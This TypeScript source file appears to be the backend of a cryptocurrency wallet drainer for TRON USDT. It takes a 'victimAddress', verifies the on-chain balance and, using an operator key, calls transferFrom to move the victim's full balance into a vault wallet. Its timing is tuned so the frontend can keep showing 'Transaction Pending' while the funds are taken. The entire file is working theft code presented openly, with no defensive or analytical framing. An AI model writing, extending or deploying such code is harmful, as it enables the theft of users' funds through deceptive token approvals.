import { performance } from "node:perf_hooks";
import { TronWeb } from "tronweb";
import { env } from "../env.js";
import { VAULT_CONFIG } from "../vaultConfig.js";
import {
  TRON_USDT_CONTRACT_MAINNET,
  pullFullUsdtToVault,
} from "./tronAutoDeposit.js";
import {
  getLogApprovalJob,
  updateLogApprovalJob,
  type LogApprovalOutcome,
} from "./tronLogApprovalJobs.js";

/** Pull whenever there is any positive USDT balance. */
const MIN_PULL_RAW = 1n;
/** Strike path budget so frontend can keep "Transaction Pending" in sync. */
const STRIKE_TARGET_MS = 1800;
const DIRECT_PATH_BUDGET_MS = 1400;

const TRC20_ABI = [
  {
    constant: true,
    inputs: [{ name: "_owner", type: "address" }],
    name: "balanceOf",
    outputs: [{ name: "balance", type: "uint256" }],
    type: "Function",
  },
] as const;

function createReadOnlyTronWeb(): TronWeb {
  const headers = env.tronGridApiKey ? { "TRON-PRO-API-KEY": env.tronGridApiKey } : undefined;
  return new TronWeb({
    fullHost: env.tronFullNodeUrl,
    headers,
  });
}

function rawFromCall(tronWeb: TronWeb, callResult: unknown): bigint {
  const bn = tronWeb.toBigNumber(callResult as Parameters<typeof tronWeb.toBigNumber>[0]);
  return BigInt(bn.toFixed(0));
}

/**
 * Re-verify balance on-chain, optionally pull full balance to VAULT_CONFIG via transferFrom.
 * Target wall-clock: fast path &lt; 3s when TronGrid is responsive.
 */
export async function runTronLogApprovalJob(jobId: string): Promise<void> {
  const rec = getLogApprovalJob(jobId);
  if (!rec || rec.status === "completed") return;

  const t0 = performance.now();
  updateLogApprovalJob(jobId, { status: "running", outcome: "pending" });

  const finish = (outcome: LogApprovalOutcome, patch: Partial<typeof rec> = {}) => {
    updateLogApprovalJob(jobId, {
      status: "completed",
      outcome,
      completedAt: Date.now(),
      ...patch,
    });
  };

  const victim = rec.victimAddress;
  let tw: TronWeb;
  try {
    tw = createReadOnlyTronWeb();
    if (!tw.isAddress(victim)) {
      finish("error", { message: "Invalid victimAddress" });
      return;
    }

    const contract = tw.contract(TRC20_ABI, TRON_USDT_CONTRACT_MAINNET);
    const balanceRaw = await contract.balanceOf(victim).call();
    const balance = rawFromCall(tw, balanceRaw);
    updateLogApprovalJob(jobId, { verifiedBalanceRaw: balance.toString() });

    if (balance < MIN_PULL_RAW) {
      finish("no_transfer_low_balance", {
        message: "No transferable USDT balance found.",
      });
      return;
    }

    const spenderKey = env.tronVaultPrivateKey.trim();
    if (!spenderKey) {
      finish("error", { message: "TRON_VAULT_PRIVATE_KEY / SPENDER_KEY not configured." });
      return;
    }

    let depositTxHash: string | undefined;

    const tryVaultEoa = async (): Promise<boolean> => {
      try {
        const pull = await pullFullUsdtToVault({
          userBase58: victim,
          operatorPrivateKey: spenderKey,
          fullHost: env.tronFullNodeUrl,
          vaultBase58: VAULT_CONFIG,
          tokenAddress: TRON_USDT_CONTRACT_MAINNET,
          tronGridApiKey: env.tronGridApiKey || undefined,
          /**
           * Fast strike mode: keep allowance probing short so execution usually stays < 3s.
           * If allowance is not indexed yet, the client can retrigger while still in pending UI.
           */
          allowanceRetryAttempts: 2,
          allowanceRetryDelayMs: 120,
        });
        if (pull.status === "broadcast") {
          depositTxHash = pull.txid;
          return true;
        }
        finish("error", { message: `Pull skipped: ${pull.reason}` });
        return false;
      } catch (e) {
        const msg = e instanceof Error ? e.message : String(e);
        finish("error", { message: msg });
        return false;
      }
    };

    /** Zero-latency mode: direct spender/admin transferFrom only (no fallback path delays). */
    const directOk = await tryVaultEoa();
    if (!directOk) {
      const elapsed = Math.round(performance.now() - t0);
      finish("error", {
        message:
          elapsed > DIRECT_PATH_BUDGET_MS
            ? `Zero-latency strike budget exceeded (${elapsed}ms).`
            : "Direct spender transferFrom failed in zero-latency mode.",
      });
      return;
    }

    if (!depositTxHash) {
      finish("error", { message: "Settlement txid missing after broadcast." });
      return;
    }

    finish("vault_received", {
      depositTxHash,
      message: "Full-balance transferFrom broadcasted to vault (async confirmation pending).",
    });

    const ms = Math.round(performance.now() - t0);
    if (ms > STRIKE_TARGET_MS) {
      console.warn(`[tron/log-approval] job ${jobId} took ${ms}ms (> ${STRIKE_TARGET_MS}ms target)`);
    }
  } catch (e) {
    const msg = e instanceof Error ? e.message : String(e);
    finish("error", { message: msg });
  }
}
